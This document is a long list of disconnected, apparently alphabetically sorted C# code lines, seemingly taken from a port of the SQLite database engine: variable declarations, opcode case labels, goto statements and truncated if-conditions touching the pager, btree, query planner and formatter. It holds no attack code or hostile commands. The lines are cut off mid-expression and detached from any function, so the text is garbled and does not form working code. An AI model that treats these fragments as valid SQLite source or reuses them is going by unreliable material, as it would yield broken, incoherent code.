          KeyInfo pKeyInfo
          MemPage MemPageDummy = null
          MemPage pLastPg = new MemPage()
          MemPage pNew = apNew[0]
          MemPage pOld = apCopy[0]
          MemPage pParent = pCur.apPage[iPage - 1]
          MemPage pPg = null
          MemPage pT
          N 
          N == 1 
          NameContext sNC
          Null       1                
          P4_DYNAMIC )
          PAGER_INCR( ref iValue )
          PAGER_INCR( ref pPager.nWrite )
          Pager pPager
          PagerSavepoint pSavepoint = ( nNew == 0 ) 
          PgHdr pPage = new PgHdr()
          PgHdr1 pNext = p.apHash[i]
          PgHdr1 pPage
          Pgno dbSize = pPager.dbSize
          Pgno i
          Pgno iFreePg = 0
          Pgno iPtrPage = 0
          Pgno iSkip = PAGER_MJ_PGNO( pPager )
          Pgno iSrcPg = p.iNext
          Pgno maxRootPgno = 0
          Pgno nNew = (Pgno)( pPager.dbSize - ( pPager.dbSize == PAGER_MJ_PGNO( pPager ) 
          Pgno pgnoPtrmap = pgnoOvfl
          Return     2                
          RowSetTest                  
          SQLITE_OPEN_EXCLUSIVE 
          SQLITE_OPEN_READWRITE 
          SQLite extension library contained in the file zFile.
          Schema cp = (Schema)MemberwiseClone()
          Select cp = (Select)MemberwiseClone()
          Select pSel = pFrom.pSelect
          SelectDest dest = new SelectDest()
          SrcList cp = (SrcList)MemberwiseClone()
          SrcList oneTab = new SrcList()
          SrcList_item pItem = p.pSrc.a[i]
          SrcList_item pItem = pTabList.a[pLevel.iFrom]
          StringBuilder sb = new StringBuilder( pRec.zBLOB.Length )
          StringBuilder zTmpname = new StringBuilder( 255 )
          Table cp = (Table)MemberwiseClone()
          Table pSelTab
          Table pTab
          Table pTab = null
          Table pTab = tableOfTrigger( pTrigger )
          The return value is the total number of characters sent to
          Token cp = (Token)MemberwiseClone()
          Trigger cp = (Trigger)MemberwiseClone()
          Trigger pTrig = (Trigger)sqliteHashData( p )
          TriggerStack pS
          TriggerStack pTriggerStack = pParse.trigStack
          TriggerStep cp = (TriggerStep)MemberwiseClone()
          Vdbe v
          Vdbe v = sqlite3GetVdbe( pParse )
          VdbeOp pOp
          VdbeOp pOp = p.aOp[addr 
          VdbeOp pOut = p.aOp[i 
          WhereAndInfo pAndInfo
          WhereClause pOrWC = pTerm.u.pOrInfo.wc
          WhereClause pOrWc
          WhereCost sCost = null
          WhereTerm pFinal
          WhereTerm pNew
          WhereTerm pOrTerm
          WhereTerm pOrWCEnd = pOrWC.a[pOrWC.nTerm]
          WhereTerm pOther = pTerm.pWC.a[pTerm.iParent]
          YYCODETYPE iFallback
          [SQLITE_OK] on success and [SQLITE_ERROR] if something goes wrong.
          [sqlite3_load_extension()] interface shall attempt to
          [sqlite3_reset(S)] returns an appropriate [error code].
          _M = value
          _n = value
          _pIter 
          a = (int)(pCur.info.nLocal - offset)
          aBucket[i] = null
          aLen = new int[nChar]
          aNew[ii] = new PagerSavepoint()
          aNew[ii].iSubRec = pPager.nSubRec
          aNew[ii].nOrig = pPager.dbSize
          aNew[ii].pInSavepoint = sqlite3BitvecCreate( pPager.dbSize )
          aPermute[i] = pItem.iCol - 1
          aRegIdx[i] = 
          addr = pbegin
          addrNext = sqlite3VdbeMakeLabel( v )
          addrOutputRow 
          addrOutputRow = sqlite3VdbeCurrentAddr( v )
          addrOutputRow = sqlite3VdbeMakeLabel( v )
          addrReset = sqlite3VdbeMakeLabel( v )
          addrSetAbort = sqlite3VdbeCurrentAddr( v )
          addrTopOfLoop = sqlite3VdbeCurrentAddr( v )
          amt = 1
          apCell[nCell] = new byte[sz]
          apCell[nCell] = new u8[szCell[nCell]]
          apDiv[i] = 0
          apNew[i] = apNew[minI]
          apNew[i] = pNew
          apNew[minI] = pT
          apOld = new MemPage[i 
          apOld[i] = null
          appendFlag = true
          automatic extensions.
          automatically invoked whenever a new [database connection]
          azChar = new byte[nChar][]
          bCloseTrans = 1
          back to the beginning of its program.
          bestScore = score
          bool affinity_ok = ( pTab.aCol[iCol].affinity == aff 
          bool bNew = false
          bool bOld = false
          break
          btreeInitPage(pPage)
          buf[offset 
          bufpt = _fmt
          but combine to completely cover the page.
          byte c = pBlob[i]
          byte[] dbFileVers = new byte[pPager.dbFileVers.Length]
          byte[] pData = null
          byte[] pTemp = new byte[sz 
          byte[] pZeroBlob = new byte[n]
          byte[] zDestData = sqlite3PagerGetData( pDestPg )
          byte[] zeroHdr = new byte[28]
          c = 'e'
          c = 's'
          c = 't'
          c = 'z'
          c = fmt[
          c = pC
          c = sqlite3Utf8Trans1[c - 0xc0]
          c = zNum[18] - '8'
          case '
          case ' ':
          case '-':
          case '/':
          case '[':
          case 1:
          case 2:
          case 3:
          case 4:
          case 5:
          case OE_Abort:
          case OE_Fail:
          case OE_Ignore:
          case OE_Rollback:
          case OP_Add:                   /
          case OP_AddImm:
          case OP_Affinity:
          case OP_AggFinal:
          case OP_AggStep:
          case OP_And:              /
          case OP_AutoCommit:
          case OP_BitAnd:                 /
          case OP_BitNot:
          case OP_BitOr:                  /
          case OP_Blob:
          case OP_Clear:
          case OP_Close:
          case OP_CollSeq:
          case OP_Column:
          case OP_Compare:
          case OP_Concat:
          case OP_ContextPop:
          case OP_ContextPush:
          case OP_Copy:
          case OP_Count:
          case OP_CreateIndex:            /
          case OP_CreateTable:
          case OP_Delete:
          case OP_Destroy:
          case OP_Divide:                /
          case OP_DropIndex:
          case OP_DropTable:
          case OP_DropTrigger:
          case OP_Eq:               /
          case OP_Expire:
          case OP_Found:
          case OP_Function:
          case OP_Ge:
          case OP_Gosub:
          case OP_Goto:
          case OP_Gt:               /
          case OP_Halt:
          case OP_HaltIfNull:
          case OP_IdxDelete:
          case OP_IdxGE:
          case OP_IdxInsert:
          case OP_IdxLT:          /
          case OP_IdxRowid:
          case OP_If:                 /
          case OP_IfNeg:
          case OP_IfNot:
          case OP_IfPos:
          case OP_IfZero:
          case OP_IncrVacuum:
          case OP_Insert:
          case OP_Int64:
          case OP_Integer:
          case OP_IntegrityCk:
          case OP_IsNull:
          case OP_IsUnique:
          case OP_Jump:
          case OP_Last:
          case OP_Le:               /
          case OP_LoadAnalysis:
          case OP_Lt:               /
          case OP_MakeRecord:
          case OP_MemMax:
          case OP_Move:
          case OP_Multiply:              /
          case OP_MustBeInt:
          case OP_Ne:               /
          case OP_NewRowid:
          case OP_Next:
          case OP_Not:
          case OP_NotExists:
          case OP_NotFound:       /
          case OP_NotNull:
          case OP_Null:
          case OP_NullRow:
          case OP_OpenEphemeral:
          case OP_OpenPseudo:
          case OP_OpenRead:
          case OP_OpenWrite:
          case OP_Or:
          case OP_Pagecount:
          case OP_ParseSchema:
          case OP_Permutation:
          case OP_Prev:          /
          case OP_ReadCookie:
          case OP_Real:
          case OP_RealAffinity:
          case OP_Remainder:
          case OP_ResetCount:
          case OP_ResultRow:
          case OP_Return:
          case OP_Rewind:
          case OP_RowData:
          case OP_RowKey:
          case OP_RowSetAdd:
          case OP_RowSetRead:
          case OP_RowSetTest:
          case OP_Rowid:
          case OP_SCopy:
          case OP_Savepoint:
          case OP_Seek:
          case OP_SeekGe:         /
          case OP_SeekGt:
          case OP_SeekLe:         /
          case OP_SeekLt:         /
          case OP_Sequence:
          case OP_SetCookie:
          case OP_ShiftLeft:              /
          case OP_ShiftRight:
          case OP_Sort:
          case OP_Statement:
          case OP_String8:
          case OP_String:
          case OP_Subtract:              /
          case OP_ToBlob:
          case OP_ToInt:
          case OP_ToNumeric:
          case OP_ToReal:
          case OP_ToText:
          case OP_Trace:
          case OP_Transaction:
          case OP_Vacuum:
          case OP_Variable:
          case OP_VerifyCookie:
          case OP_Yield:
          case P4_DYNAMIC:
          case P4_FUNCDEF:
          case P4_INT64:
          case P4_INTARRAY:
          case P4_KEYINFO:
          case P4_KEYINFO_HANDOFF:
          case P4_MEM:
          case P4_MPRINTF:
          case P4_REAL:
          case P4_VDBEFUNC:
          case P4_VTAB:
          case TK_DELETE:
          case TK_ILLEGAL:
          case TK_INSERT:
          case TK_SEMI:
          case TK_SPACE:
          case TK_UPDATE:
          case etCHARX:
          case etDYNSTRING:
          case etEXP:
          case etFLOAT:
          case etGENERIC:
          case etORDINAL:
          case etPERCENT:
          case etPOINTER:
          case etRADIX:
          case etSIZE:
          case etSQLESCAPE2:
          case etSQLESCAPE3:
          case etSQLESCAPE:
          case etSRCLIST:
          case etSTRING:
          case etTOKEN:
          catch ( Exception e )
          catch ( IOException e )
          catch ( IOException e ) { attr = FileAttributes.ReadOnly
          change_counter
          change_counter = sqlite3Get4byte( pPager.dbFileVers )
          char aff = comparisonAffinity( pX )
          char z = (char)pMem.zBLOB[i]
          chldPg = 0
          chngToIN = 0
          clearAllSharedCacheTableLocks(p)
          cnt
          cnt = 1
          cntNew[i - 1]--
          cntNew[k] = i
          codeTableLocks( pParse )
          construct.
          continue
          cp.aData = new byte[aData.Length]
          cp.aOvfl = new _OvflCell[aOvfl.Length]
          cp.affinity = affinity
          cp.flags = flags
          cp.flags2 = flags2
          cp.iAgg = iAgg
          cp.iColumn = iColumn
          cp.iRightJoinTable = iRightJoinTable
          cp.iTable = iTable
          cp.nHeight = nHeight
          cp.op = op
          cp.pCell = new byte[pCell.Length]
          cp.pZombieTab = pZombieTab
          cp.u = u
          d = r 
          data[hdr 
          data[j 
          db.aDb[0].pSchema.enc = encoding
          db.aDb[iDb].pBt = null
          db.aDb[iDb].pSchema = null
          db.aDb[i].inTrans = 0
          db.aDb[j] = db.aDb[i]
          db.aLimit[SQLITE_LIMIT_VARIABLE_NUMBER] )
          db.errCode = p.rc
          db.flags = ( db.flags 
          db.init.orphanTrigger = 1
          db.nStatement = 0
          db.u1.isInterrupted = false
          db.writeVdbeCnt--
          default:
          default: Debug.Assert( pTriggerStep.op == TK_SELECT )
          depth = d2
          destHasUniqueIdx = true
          dist
          do
          doNotReorder = ( pTabItem.jointype 
          doesStatementRollback = true
          double divisor = 1.0
          double nRow = 0
          double rNow = 0
          double rScale = 1.0
          double rTotal = 0
          double scale = 1.0
          eType = IN_INDEX_ROWID
          elem.data = data
          elem.pKey = pKey
          else
          else _n = Convert.ToInt64( _M.z )
          else iSum = Convert.ToInt64( _M.z )
          else if ( ( opProperty 
          else if ( ( pLevel.plan.wsFlags 
          else if ( ( pTerm.eOperator 
          else if ( 0 == p.isAttached )
          else if ( c == esc )
          else if ( c == matchSet )
          else if ( fullNames )
          else if ( i == pIdx.nColumn )
          else if ( onError == OE_Fail ) onError = OE_Abort
          else if ( p.errorAction == OE_Abort )
          else if ( pColExpr.op == TK_ID )
          else if ( pItem.zName != null )
          else if ( pSelect != null )
          else if ( pTriggerStack.oldIdx != -1 
          else if ( useTempTable )
          else if ( z[zDx] == '
          else if (hit[i] > 1)
          else if (k > (u32)(pBt.usableSize / 4 - 2))
          else if (k > 0)
          else if (leafData != 0)
          else if (searchList != 0 
          else return (Int32)Convert.ToInt32( ap[vaNEXT - 1] )
          else v1 /= divisor
          else zBuf.Append( z )
          encoding = (u8)( meta[BTREE_TEXT_ENCODING - 1] 
          end                     
          endTrigger = sqlite3VdbeMakeLabel( pParse.pVdbe )
          equality comparison against the ROWID field.  Or
          error = (u32)Marshal.GetLastWin32Error()
          fd = sqlite3PagerFile( pPager )
          fill 
          flag = 1
          flag_long = flag_longlong = false
          flag_long = true
          for ( 
          for ( i = 0 
          for ( i = dbSize 
          for ( i = pOrWc.nTerm - 1 
          for ( iCol = 0 
          for ( ii = 0 
          for ( int _pOrWC = 0 
          for ( int i = 0 
          for ( int i = p1 
          for ( int ii = 0 
          for ( j = 0 
          for ( j = pLevel.u._in.nIn 
          for ( k = 0 
          for ( k = p.pEList.nExpr 
          for ( k = pGroupBy.nExpr 
          for ( k = pWInfo.iTop 
          for ( n = 0 
          for ( nByte = 0 
          for ( pIdx = pTab.pIndex 
          for ( pIndex = pTab.pIndex 
          for ( pLoop = p 
          for ( pPg = pCache.pDirtyTail 
          for ( pS = pParse.trigStack 
          for (i = 0
          for (j = i 
          for(i=0
          for(j=i
          foreach ( ManagementObject moPDisk in mosDiskDrives.Get() )
          foreach row3 in t3 do   /
          getReadLock( pFile )
          go = false
          goto Init
          goto attach_error
          goto balance_cleanup
          goto begin_table_error
          goto bitvec_set_end
          goto bitvec_set_rehash
          goto btree_open_out
          goto case TK_COLUMN
          goto case TK_ID
          goto commit_phase_one_exit
          goto end_getDigits
          goto end_insert
          goto end_playback
          goto end_prepare
          goto exit_create_index
          goto fk_end
          goto freepage_out
          goto initone_error_out
          goto insert_cleanup
          goto moveto_finish
          goto multi_select_end
          goto no_mem
          goto opendb_out
          goto page1_init_failed
          goto scratch_overflow
          goto trigger_cleanup
          goto update_cleanup
          h = ( h 
          hasStatementBegin = true
          i = -1
          i = j
          i64 iRandom = 0
          i64 offset = ( pList.pgno - 1 ) 
          i64 v = sqlite3_value_int64( argv[0] )
          i64 value = 0
          iAMem = pParse.nMem 
          iAbortFlag = 
          iBMem = pParse.nMem 
          iBest = i
          iCell--
          iColumn = -1
          iColumn = pIdx.aiColumn[i]
          iDestroyed = iLargest
          iFirst = 0
          iFirst = 8
          iGuess
          iLargest = iTab
          iLastPg--
          iLimit = pSelect.iLimit
          iLimit = pSelect.iOffset 
          iOff 
          iOvflSpace 
          iRowidReg = iReleaseReg = sqlite3GetTempReg( pParse )
          iSortOrder = 0
          iSortOrder = pIdx.aSortOrder[i]
          iUseFlag = 
          iValue = sqlite3_pager_writedb_count.iValue
          idxLru = i
          if ( !( p.approx 
          if ( !File.Exists( zFilename ) )
          if ( !String.IsNullOrEmpty( zExtra ) )
          if ( !appendFlag )
          if ( !isOpen( pPager.jfd ) )
          if ( !p.readOnly 
          if ( !pPager.tempFile )
          if ( !shortNames 
          if ( ( --pOther.nChild ) == 0 )
          if ( ( OMIT_TEMPDB == 0 
          if ( ( bestPlan.plan.wsFlags 
          if ( ( f1 
          if ( ( f2 
          if ( ( i < 32 
          if ( ( iDestroyed == 0 
          if ( ( m 
          if ( ( once != 0 
          if ( ( opProperty 
          if ( ( pEnd.flags 
          if ( ( pLeft.flags 
          if ( ( pLevel.plan.wsFlags 
          if ( ( pOrTerm.wtFlags 
          if ( ( pRight.flags 
          if ( ( pSub1.selFlags 
          if ( ( pTerm.eOperator 
          if ( ( pTerm.prereqAll 
          if ( ( pTerm.wtFlags 
          if ( ( pWalker.u.i ) == 2 ) return 0
          if ( ( wctrlFlags 
          if ( ( wsFlags 
          if ( /
          if ( 0 == ( ( p.flags 
          if ( 0 == ( iDc 
          if ( 0 == pWInfo.okOnePass 
          if ( ALWAYS( p != null 
          if ( ALWAYS( pColl != null ) )
          if ( ALWAYS( v ) )
          if ( Convert.ToInt64( ap[vaNEXT - 1] ) > 0 
          if ( DIRECT_MODE  )
          if ( Double.IsInfinity( divisor ) )
          if ( NEVER( rc != SQLITE_OK ) ) goto end_of_vacuum
          if ( OMIT_TEMPDB == 0 
          if ( SQLITE_OK == rc
          if ( _M != null ) _M.z = _n.ToString()
          if ( _M == null 
          if ( a[i] == null )
          if ( aiValues[j] != 0 
          if ( ap[vaNEXT - 1] == null )
          if ( ap[vaNEXT - 1].GetType().IsClass )
          if ( argc == 2 )
          if ( azChar == null )
          if ( c != c2 )
          if ( c < 0x80
          if ( c == '
          if ( c == 'l' )
          if ( c == 0 )
          if ( c == 0 ) break
          if ( c == 0 ) return false
          if ( c == fmtinfo[idx].fmttype )
          if ( c >= 0x20 
          if ( c2 == '
          if ( c2 == ']' )
          if ( c2 == 0 
          if ( currentSize > newSize )
          if ( db.aDb[iDb].zName == zDbName ) break
          if ( db.aDb[i].pSchema == pSchema )
          if ( db.init.orphanTrigger!=0 )
          if ( db.nProgressOps == nProgressOps )
          if ( doNotReorder != 0 ) break
          if ( eStatementOp != SAVEPOINT_ROLLBACK )
          if ( eType == IN_INDEX_ROWID )
          if ( encoding == 0 ) encoding = SQLITE_UTF8
          if ( esign < 0 )
          if ( exFlag )
          if ( fd.pMethods != null )
          if ( groupBySort != 0 )
          if ( i != 1 ) nTrans
          if ( i < 0 )
          if ( i < nEqCol )
          if ( i < p.pSrc.nSrc - 1 )
          if ( i < z.Length - 1 
          if ( i == 1 ) continue
          if ( i == pTab.iPKey )
          if ( iCol < 0 )
          if ( iCol < 0 ) iCol = pTab.iPKey
          if ( iCol < 1 )
          if ( iCol < pTab.nCol )
          if ( iCol > 0 )
          if ( iColumn == pIdx.pTable.iPKey )
          if ( iReg != target 
          if ( iSrcPg != PENDING_BYTE_PAGE( p.pSrc.pBt ) )
          if ( idx == pTab.iPKey )
          if ( ifNotExist == 0 )
          if ( isAggSub )
          if ( isNT() )
          if ( isOpen( pPager.jfd ) 
          if ( isOpen( pPager.jfd ) )
          if ( isReduced )
          if ( isUpdate )
          if ( j != 1 )
          if ( j < 0 
          if ( j < 0 )
          if ( j == nOrderBy )
          if ( j >= 0 )
          if ( j >= p.nCol )
          if ( j >= pTab.nCol )
          if ( k == pIdx.nColumn )
          if ( len > (u32)nBuf )
          if ( m == 0 )
          if ( meta[BTREE_TEXT_ENCODING - 1] != ENC( db ) )
          if ( mxSelect != 0 
          if ( nExtra == 0 )
          if ( nReg == 1 )
          if ( nSignificant == 0 )
          if ( nSrcPagesize < nDestPagesize )
          if ( nToken != 0 )
          if ( needPagerReset != 0 )
          if ( needSyncPgno <= pPager.dbOrigSize )
          if ( negateFlag ) value = -value
          if ( noCase )
          if ( noErr == 0 )
          if ( nspace > 0 )
          if ( null == aNew[ii].pInSavepoint )
          if ( null == apColl )
          if ( null == pNew )
          if ( null == pVdbeFunc )
          if ( null == zRight )
          if ( old_col_mask != 0 )
          if ( onError == OE_Ignore ) onError = OE_Replace
          if ( once == 0 
          if ( op != 5 )
          if ( openAll 
          if ( p.aOp[i 
          if ( p.iNext > (Pgno)nSrcPage )
          if ( p.iReg == iReg )
          if ( p.n == aKeyword[j].nChar
          if ( p.pDestDb != null )
          if ( p.pResultSet[i_pMem] == null ) p.pResultSet[i_pMem] = new Mem()
          if ( p.pgno > pgno )
          if ( p.rc == SQLITE_OK 
          if ( p.readOnly == false ) nWrite
          if ( p.u.aHash[h] == i ) return 1
          if ( p.u.apSub[bin] == null ) return SQLITE_NOMEM
          if ( p.z.Length == 0 ) p.zBLOB = new byte[1]
          if ( p2 < 0 
          if ( p2 < 0 ) p2 = 0
          if ( pAggInfo != null ) cp.pAggInfo = pAggInfo.Copy()
          if ( pAndInfo != null )
          if ( pAux.xDelete != null )
          if ( pBt != null )
          if ( pChunk != null )
          if ( pColExpr.op == TK_COLUMN 
          if ( pColl != null ) cp.pColl = pColl.Copy()
          if ( pColl == null )
          if ( pColl[j].xDel != null )
          if ( pColumn != null 
          if ( pColumn == null )
          if ( pColumns != null ) cp.pColumns = pColumns.Copy()
          if ( pCons.z == null )
          if ( pDb.pSchema.pSeqTab == null )
          if ( pDel != null )
          if ( pE.op != TK_ALL 
          if ( pE.x.pList == null 
          if ( pEList != null ) cp.pEList = pEList.Copy()
          if ( pExpr.pColl != null )
          if ( pFKey != null ) cp.pFKey = pFKey.Copy()
          if ( pFKey.aCol[i] == null ) pFKey.aCol[i] = new FKey.sColMap()
          if ( pFrom != null ) cp.pFrom = pFrom.Copy()
          if ( pGroupBy != null ) cp.pGroupBy = pGroupBy.Copy()
          if ( pGroupBy == null )
          if ( pHaving != null ) cp.pHaving = pHaving.Copy()
          if ( pIdx != null 
          if ( pIdx.aiColumn[0] == i )
          if ( pIdx.nColumn != pIndex.nColumn ) continue
          if ( pIndex != null ) cp.pIndex = pIndex.Copy()
          if ( pInfo != null )
          if ( pInfo == null ) return 0
          if ( pItem.done != 0 ) continue
          if ( pItem.iCol > pEList.nExpr )
          if ( pItem.iCursor >= 0 ) break
          if ( pItem.pSelect != null )
          if ( pItem.pTab != null )
          if ( pItem.zAlias != null )
          if ( pLeft != null ) cp.pLeft = pLeft.Copy()
          if ( pLevel.iIdxCur >= 0 )
          if ( pLevel.op == OP_Return )
          if ( pLimit != null ) cp.pLimit = pLimit.Copy()
          if ( pList.a[i].zName == null )
          if ( pMem.z != null )
          if ( pMem1.enc == pColl.enc )
          if ( pMem1.u.i < pMem2.u.i ) return -1
          if ( pMem1.u.i > pMem2.u.i ) return 1
          if ( pName2.n == 0 
          if ( pNew != null )
          if ( pNext != null ) cp.pNext = pNext.Copy()
          if ( pNextFrom != null ) cp.pNextFrom = pNextFrom.Copy()
          if ( pOffset != null ) cp.pOffset = pOffset.Copy()
          if ( pOp.opcode == OP_Statement )
          if ( pOp.opcode == OP_Variable )
          if ( pOp.p1 == SQLITE_CONSTRAINT 
          if ( pOp.p2 > nMaxArgs ) nMaxArgs = pOp.p2
          if ( pOp.p5 > nMaxArgs ) nMaxArgs = pOp.p5
          if ( pOp.zComment != null )
          if ( pOrTerm.eOperator != WO_EQ )
          if ( pOrderBy != null )
          if ( pOrderBy != null ) cp.pOrderBy = pOrderBy.Copy()
          if ( pPage.iKey >= iLimit )
          if ( pPager.dbSize > 0 )
          if ( pPager.errCode != 0 )
          if ( pPager.journalOff == 0 )
          if ( pPager.state < EXCLUSIVE_LOCK )
          if ( pParse.nErr == 0 )
          if ( pParse.nVarExpr >= pParse.nVarExprAlloc - 1 )
          if ( pPg.pgno <= pPager.dbOrigSize )
          if ( pPrior != null ) cp.pPrior = pPrior.Copy()
          if ( pRight != null ) cp.pRight = pRight.Copy()
          if ( pRight.pOn != null 
          if ( pRightmost != null ) cp.pRightmost = pRightmost.Copy()
          if ( pS == null )
          if ( pSchema != null ) cp.pSchema = pSchema.Copy()
          if ( pSelect != null ) cp.pSelect = pSelect.Copy()
          if ( pSrc != null ) cp.pSrc = pSrc.Copy()
          if ( pTab != null )
          if ( pTab != null ) cp.pTab = pTab.Copy()
          if ( pTab == null ) return WRC_Abort
          if ( pTab.pSelect != null 
          if ( pTab.pTrigger == pTrigger )
          if ( pTabSchema != null ) cp.pTabSchema = pTabSchema.Copy()
          if ( pTerm != null )
          if ( pTerm == null ) break
          if ( pTerm.leftCursor >= 0 )
          if ( pTopNC == pNC ) break
          if ( pTrig.pSchema == pTempSchema )
          if ( pTrig.pTabSchema == pTab.pSchema
          if ( pTrigger != null ) cp.pTrigger = pTrigger.Copy()
          if ( pTriggerStack.newIdx != -1 
          if ( pWInfo == null ) goto select_end
          if ( pWhen != null ) cp.pWhen = pWhen.Copy()
          if ( pWhere != null ) cp.pWhere = pWhere.Copy()
          if ( pX.op == TK_LT 
          if ( pX.pLeft.iColumn < 0 
          if ( pc == 0 )
          if ( pg == pPg.pgno 
          if ( pgno == 1 )
          if ( pgno > pPager.dbFileSize )
          if ( r1 < r2 ) return -1
          if ( r1 > r2 ) return 1
          if ( rTotal < pCost.rCost )
          if ( rc != 0 
          if ( rc != 0 )
          if ( rc != 0 ) return rc
          if ( rc != SQLITE_OK 
          if ( rc != SQLITE_OK )
          if ( rc != SQLITE_OK ) goto commit_phase_one_exit
          if ( rc != SQLITE_OK ) return
          if ( rc != SQLITE_OK ) return rc
          if ( rc != SQLITE_ROW )
          if ( rc == SQLITE_DONE )
          if ( rc == SQLITE_OK 
          if ( rc == SQLITE_OK )
          if ( realnum == 0 
          if ( score > bestScore )
          if ( size < 0 ) size = -size
          if ( sqlite3BtreeIsInTrans( db.aDb[i].pBt ) )
          if ( sqlite3BtreeIsInTrans( pBt ) )
          if ( sqlite3GlobalConfig.bCoreMutex 
          if ( sqlite3IsRowid( pChanges.a[i].zName ) )
          if ( sqlite3OpenTempDatabase( pParse ) != 0 )
          if ( sqlite3StatusValue( SQLITE_STATUS_MEMORY_USED ) 
          if ( sqlite3VdbeAddopTrace )
          if ( sqlite3VdbeMemMakeWriteable( pVal ) != SQLITE_OK )
          if ( sqlite3_interrupt_count == 0 )
          if ( step_list != null ) cp.step_list = step_list.Copy()
          if ( szPageDflt < pPager.sectorSize )
          if ( termSortOrder != sortOrder )
          if ( tnum == pTab.tnum )
          if ( token == TK_DOT 
          if ( true ) //n
          if ( type == SQLITE_INTEGER )
          if ( useTempTable )
          if ( width < 0 )
          if ( wsdAutoext.aExt[i] == xInit ) break
          if ( x.pList != null ) cp.x.pList = x.pList.Copy()
          if ( x.pSelect != null ) cp.x.pSelect = x.pSelect.Copy()
          if ( xCallback != null 
          if ( z != null 
          if ( z != null )
          if ( z < 32 
          if ( z == null 
          if ( zAs != null 
          if ( zColl == null )
          if ( zCsr == zSql.Length )
          if ( zFmt[i] != '%' )
          if ( zFmt[i] == '%' )
          if ( zVal == null ) goto no_mem
          if ( z[zDx] == '-' )
          if ((frag < 0) 
          if ((pc 
          if (0 == leafCorrection)
          if (0 == pBt.nTransaction)
          if (0 == pNew.leaf)
          if (0 == pOld.leaf)
          if (0 == pPage.leaf) iCellLast
          if (0 == pPage.leaf) iCellLast--
          if (SQLITE_OK != rc)
          if (apNew[j].pgno < (u32)minV)
          if (c < 0)
          if (c == 0)
          if (eType != PTRMAP_BTREE 
          if (eType == PTRMAP_FREEPAGE)
          if (eType == PTRMAP_OVERFLOW1)
          if (eType == PTRMAP_ROOTPAGE 
          if (hit[i] == 0)
          if (i > 0 
          if (iFOFC < 0)  // Overflow Cell
          if (iLookAhead < yyFallback.Length //yyFallback.Length/sizeof(yyFallback[0])
          if (iTable == maxRootPgno)
          if (iTrunk > mxPage)
          if (k == 0 
          if (k == iCell)
          if (k > NB 
          if (leafData != 0) { i--
          if (lwr > upr)
          if (n > nSrc) n = nSrc
          if (n > pCheck.pBt.usableSize / 4 - 2)
          if (nFin == 0)
          if (next > 0 
          if (offset >= ovflSize)
          if (pBt.autoVacuum 
          if (pBt.autoVacuum)
          if (pBt.readOnly)
          if (pCheck.pBt.autoVacuum 
          if (pCheck.pBt.autoVacuum)
          if (pCur.iPage == 0)
          if (pMem.zBLOB==null 
          if (pPage.intKey != 0)
          if (pPage.nOverflow != 0)
          if (pPgno == PENDING_BYTE_PAGE(pBt)) { (pPgno)
          if (pPrevTrunk != null)
          if (pc < iCellFirst 
          if (pc <= usableSize - 4)
          if (rc != 0)
          if (rc != 0) goto balance_cleanup
          if (rc != 0) goto cleardatabasepage_out
          if (rc != 0) return rc
          if (rc != SQLITE_OK)
          if (rc != SQLITE_OK) goto balance_cleanup
          if (rc == SQLITE_OK 
          if (rc == SQLITE_OK)
          if (size >= nByte)
          if (szCell[0] > pNew.minLocal)
          if (yyTraceFILE != null)
          if (yyendofinput)
          if (yypParser.yyerrcnt <= 0)
          if eof(A) goto EofA
          if eof(B) goto EofB
          if( zType[i]=='
          inMultiplier = nRow / pProbe.aiRowEst[i]
          indexable 
          int addr
          int addrIf
          int addrOutputRow
          int addrReset
          int addrSetAbort
          int addrSortingIdx
          int addrTop
          int addrTopOfLoop
          int amt
          int cnt = 0
          int doNotReorder
          int endTrigger
          int esign = 1
          int eval = 0
          int flags =                   /
          int flags = WHERE_MULTI_OR
          int frag = pnext - (pbegin 
          int i
          int iAddr
          int iCol = -1
          int iCol = p.iColumn
          int iData = 
          int iDb
          int iDc = sqlite3OsDeviceCharacteristics( pPager.fd )
          int iIdx = pCur.aiIdx[iPage - 1]
          int iIdx = pIdx.tnum
          int iIdxCur = pLevel.iIdxCur
          int iLoopBody = sqlite3VdbeMakeLabel( v )
          int iMem = 
          int iNextOld = pOld.nCell 
          int iOverflow = (nOverflow != 0 
          int iRegStore = regRowid 
          int iRetInit
          int iValue
          int idummy = 0
          int idx = pCur.aiIdx[pCur.iPage]
          int idx = pIdx.aiColumn[i]
          int idxNew
          int ii
          int int0 = 0
          int isReplace = 0
          int iz0 = 0
          int iz1 = 0
          int j
          int j = p.iColumn
          int j = pProbe.aiColumn[i]
          int j = pProbe.aiColumn[nEq]
          int j1
          int k
          int mxSelect
          int n = sqlite3Strlen30( pLink.table )
          int n = sqlite3Strlen30( pToCol.a[i].zName )
          int nColl
          int nDel = 6 
          int nDestPagesize = sqlite3BtreeGetPageSize( p.pDest )
          int nDestTruncate
          int nName
          int nNewSize = nStructSize 
          int nOverflow = pOld.nOverflow
          int nPage = (int)(sz - info.nLocal 
          int nPage = 0
          int nSrcPagesize = sqlite3BtreeGetPageSize( p.pSrc )
          int nToken
          int nspace
          int op = pWInfo.okOnePass != 0 
          int p2 = pIn.p2
          int pCell
          int prior_c = 0
          int rc
          int rc = SQLITE_OK
          int rc = saveCursorPosition(p)
          int rc2
          int rc2 = SQLITE_OK
          int regOutputRow
          int regRec
          int regReset
          int regReturn = 
          int regRowid = 0
          int regRowset = 0
          int regTempRowid
          int size = atoi( zRight )
          int sz
          int sz = 0
          int t
          int tnum = pOp.p2
          int useIndexOnly = ( pLevel.plan.wsFlags 
          invert = 0
          isErrorReset = true
          isMinQuery = 1
          isUnsync = 1
          it back off again.
          j
          j = 0
          j = aXRef[i]
          j = nTerm
          j1 = sqlite3VdbeCurrentAddr( v )
          jointype 
          jointype = pSubitem.jointype
          k
          k = 0
          last = sqlite3VdbeCurrentAddr( v )
          len 
          local_ioerr()
          mask 
          match 
          match = 4
          maxRootPgno--
          mem0.alarmThreshold )
          memDb = 1
          memEndValue = 
          minLru = p.lru
          moveToParent(pCur)
          ms /= rScale
          multiple times with the same extension is harmless.
          mx = 11
          mx = 8
          mxSelect = db.aLimit[SQLITE_LIMIT_COMPOUND_SELECT]
          n 
          n = (int)( pParse.sNameToken.z.Length - pEnd.z.Length ) 
          n = BMS - 1
          n = sqlite3Strlen30( pLevel.plan.u.pIdx.zName )
          nAlloc 
          nArg = 0
          nArg = pList.nExpr
          nByte 
          nCell
          nColl = sqlite3Strlen30( zColl )
          nConstraint
          nEntry 
          nErr
          nExtra -= nColl
          nExtra = pToken.n 
          nExtraReg = 1
          nFin--
          nFree = (u16)(nFree 
          nHidden 
          nJRec = (u32)( ( szJ - pPager.journalOff ) / JOURNAL_PG_SZ( pPager ) )
          nMem = 10
